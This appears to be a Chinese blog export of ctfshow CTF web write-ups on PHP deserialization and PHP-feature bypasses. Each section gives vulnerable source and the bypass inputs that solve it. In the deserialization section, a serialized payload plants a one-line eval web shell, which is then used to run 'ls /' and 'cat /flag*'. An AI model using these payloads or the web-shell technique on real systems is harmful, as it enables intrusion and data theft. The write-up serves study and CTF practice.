<span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p><code>__sleep()魔术方法</code><br>serialize() 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code> 。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 null 被序列化，并产生一个 E_NOTICE 级别的错误。<br><code>__sleep()</code> 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。使用 <code>__serialize()</code> 接口替代。<br><code>__sleep()</code> 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</p>
</li>
<li><p><code>__wakeup()魔术方法</code><br>当使用 unserialize() 反序列化一个对象成功后，会自动调用该对象的 <code>__wakup()</code> 魔术方法。<br>该方法经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p>
</li>
<li><p><code>__unserialize()魔术方法</code><br>unserialize() 检查是否存在具有名为 <code>__unserialize()</code> 的魔术方法。此函数将会传递从 <code>__serialize()</code> 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。<br>注意:<br>如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略。<br>此特性自 PHP 7.4.0 起可用。</p>
</li>
<li><p><code>__invoke()魔术方法</code><br>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。</p>
</li>
</ul>
<p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">魔术方法</a></p>
<p>由于源码中同时存在 <code>__wakeup()</code> 和 <code>__unserialize()</code> ，因此首先查看php版本。<br>在 <code>Response Headers</code> 中可以看到 <code>X-Powered-By: PHP/7.4.16</code> ，于是只有 <code>__unserialize()</code> 方法会生效。<br>由于源码中的 <code>__invoke()</code> 方法没有调用，因此这个方法实际无用。<br>变量code的值实际为变量username与变量password之和。<br>最终，我们选择 <code>file_put_contents()</code> 函数作为终点，构造出一个php页面进去代码执行即可。</p>
<ol start="2">
<li>构造payload<br>根据弱类型比较（&#x3D;&#x3D;），877.php&#x3D;&#x3D;877。于是username构造为877.php，password构造为一句话木马。<br>由此写出脚本如下：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
由于其中含有php代码，所以可能在页面上显示不全，可以查看源码复制序列化字符串。<br>将得到的序列化字符串构造为payload:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?vip=O:10:&quot;ctfshowvip&quot;:2:&#123;s:8:&quot;username&quot;;s:7:&quot;877.php&quot;;s:8:&quot;password&quot;;s:28:&quot;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
payload执行后，访问877.php页面，同时POST传参cmd&#x3D;phpinfo();<br>成功显示php页面，则代表执行成功，可以进行命令执行了。<br>接下来POST传参cmd&#x3D;system(‘ls &#x2F;‘);<br>继续POST传参：cmd&#x3D;system(‘cat &#x2F;flag*’);<br>成功拿到flag。</li>
</ol>
<h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><ol>
<li>查看源码<br>初始页面：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
message.php页面<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>通过初始页面的注释，我们发现了message.php页面。<br>通过比较两个页面可以发现，只需要将变量msg的值序列化为字符串就可以拿到flag了。</p>
<ol start="2">
<li>构造payload<br>先写一个简洁的脚本：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">message</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
得到的字符串在message.php页面通过Cookie传入。<br>成功拿到flag。</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-web入门-php特性</title>
    <url>/2022/12/15/ctfshow-web%E5%85%A5%E9%97%A8-php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了继续巩固php基础！</p>
<span id="more"></span>
<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
首先include包含了flag.php，然后通过get方式传入num参数。</li>
</ol>
<ul>
<li><p>preg_match()函数：<br>执行匹配正则表达式。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$matches</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span></span><br><span class="line">): <span class="keyword">int</span>|<span class="literal">false</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pattern</span></span><br><span class="line"><span class="comment">要搜索的模式，字符串类型。</span></span><br><span class="line"><span class="comment">subject</span></span><br><span class="line"><span class="comment">输入字符串。</span></span><br><span class="line"><span class="comment">matches</span></span><br><span class="line"><span class="comment">如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span></span><br><span class="line"><span class="comment">flags</span></span><br><span class="line"><span class="comment">flags 可以被设置为以下标记值的组合：</span></span><br><span class="line"><span class="comment">PREG_OFFSET_CAPTURE</span></span><br><span class="line"><span class="comment">如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的字节数)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</span></span><br><span class="line"><span class="comment">PREG_UNMATCHED_AS_NULL</span></span><br><span class="line"><span class="comment">使用该标记，未匹配的子组会报告为 null；未使用时，报告为空的 string。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个位置开始搜索(单位是字节)。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">返回值</span></span><br><span class="line"><span class="comment">如果 pattern 匹配到指定 subject，则 preg_match() 返回 1，如果没有匹配到则返回 0， 或者在失败时返回 false。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>intval()函数<br>获取变量的整数值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval(mixed $value, int $base = 10): int</span><br><span class="line">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</span><br><span class="line">注意:</span><br><span class="line">如果 base 是 0，通过检测 value 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>构造语句<br>因为preg_match在匹配字符串不为“字符串”时，会提示错误，返回false。因此我们可以传入一个数组。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num[]=a</span><br></pre></td></tr></table></figure>
拿到flag</li>
</ol>
<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>分析源码可知，条件为num变量的10进制值为4476时不能通过，但又要求:<br><code>intval($num,0)===4476</code><br>根据上面的知识点可知，当base为0时检测value的前缀。<br>那么我们可以更改为十进制以外的前缀，并且让其10进制值为4476，便可通过。</p>
</li>
<li><p>构造语句<br><code>?num=0x117c</code><br>拿到flag</p>
</li>
</ol>
<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><ol>
<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
知识点总结：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^ 	 	匹配开头</span><br><span class="line">$		匹配末尾</span><br><span class="line">/i  	不区分大小写</span><br><span class="line">/m 		多行匹配</span><br></pre></td></tr></table></figure>
多行匹配（不匹配换行符）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^xxx$</span><br><span class="line">^yyy$</span><br><span class="line">^zzz$</span><br></pre></td></tr></table></figure>
单行匹配（匹配换行符）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^xxx</span><br><span class="line">yyy</span><br><span class="line">zzz$</span><br></pre></td></tr></table></figure></li>
</ol>
<p>第1个if语句是多行匹配，第2个if语句是单行匹配。</p>
<ol start="2">
<li>构造语句<br>通过使用换行符，可以让换行符后为php，换行符前为其它字符。能成功绕过2个if语句。<br>于是可以得到：<br><code>?cmd=a%0aphp</code><br>拿到flag<br>该题原型为一个<a href="https://blog.csdn.net/qq_46091464/article/details/108278486">解析漏洞</a></li>
</ol>
<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p>和web90题差不多，区别在于从&#x3D;&#x3D;&#x3D;变成了&#x3D;&#x3D;，&#x3D;&#x3D;会进行弱类型转换<br>解决方法很多，比如0x117c, 4476.1, 4476e123<br>我的： <code>?num=0x117c</code><br>拿到flag</p>
<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p>和web92题类似，只不过不能用字符了，所以16进制和科学计数法不能使用，但可以通过8进制或小数点绕过<br>我的： <code>?num=4476.1</code><br>拿到flag</p>
<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p>和web93题类似，这一次把浮点数4476.1和八进制010574都过滤了，我们仔细看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目中增加的条件是：num参数中必须包含0，但不能在首位，于是我们可以在八进制前添加一个空格绕过：<br><code>?num= 010574</code><br>或者将数字0添加到小数点后：<br><code>?num=4476.01</code><br>均可拿到flag</p>
<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p>这一题和web94差不多，只不过把小数点过滤了，不能使用浮点数，但可以在八进制前面加上空格之类的绕过<br><code>?num= 010574</code><br>拿到flag</p>
<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p>看到highlight_file()函数，想到文件包含<br>所以直接构造文件包含的语句：<br><code>?u=php://filter/convert.base64-encode/resource=flag.php</code><br>得到的数据经过base64解码即可拿到flag<br>或者使用相对路径： <code>?u=./flag.php</code><br>或者使用绝对路径： <code>?u=/var/www/html/flag.php</code><br>均可拿到flag</p>
<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><ol>
<li><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这一题是需要通过POST传入a，b两个参数。<br>条件是值不能相等，且md5值要相等。</p>
</li>
<li><p>构造payload<br>抓包将头部的GET改为POST，然后添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
<p>最后我们有两种构造方法来传参</p>
</li>
</ol>
<ul>
<li><p>第1种（php中hash比较缺陷）<br>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的。<br>由此可以构造出：<br><code>a[]=1&amp;b[]=2</code><br>报错并且成功拿到flag</p>
</li>
<li><p>第2种（生成MD5相同但内容不同的2个文件）<br>用md5-fastcoll工具可以生成MD5相同但内容不同的两个文件，编写python脚本提取文件内容，并进行url编码就行了。<br>以下是几个MD5相同但内容不同的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br><span class="line"></span><br><span 